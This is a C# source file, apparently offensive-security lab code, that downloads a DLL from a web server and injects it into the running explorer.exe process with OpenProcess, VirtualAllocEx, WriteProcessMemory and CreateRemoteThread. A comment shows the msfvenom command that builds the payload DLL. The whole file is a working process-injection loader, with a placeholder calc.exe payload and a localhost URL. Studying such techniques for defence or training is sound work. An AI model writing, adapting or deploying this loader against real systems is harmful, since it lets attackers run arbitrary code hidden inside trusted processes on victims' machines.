using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
        SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            //Download DLL to the MyDocuments folder
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\calc.dll";
            WebClient wc = new WebClient();

            // msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc.dll
            wc.DownloadFile("http://127.0.0.1/calc.dll", dllName);

            //Find all processes with the name explorer and get the PID of the 1st
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            //Opens a handle to the remote explorer process
            //PROCESS_ALL_ACCESS = 0x001F0FFF
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            //Allocate memory in remote process to copy bytes to
            // MEM_COMMIT + MEM_RESERVE = 0x3000
            // PAGE_READWRITE = 0x04
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x04);

            //Write buffer to allocated memory
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            uint oldProtect = 0;
            // PAGE_EXECUTE_READ = 0x20
            VirtualProtectEx(hProcess, addr, 0x1000, 0x20, out oldProtect);

            //Resolve address of LoadLibrary in remote process
            //Windows DLLs are allocated at the same base address across process
            //So LoadLibrary in current process will match remote process
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            //Execte LoadLibraryA in remote process
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
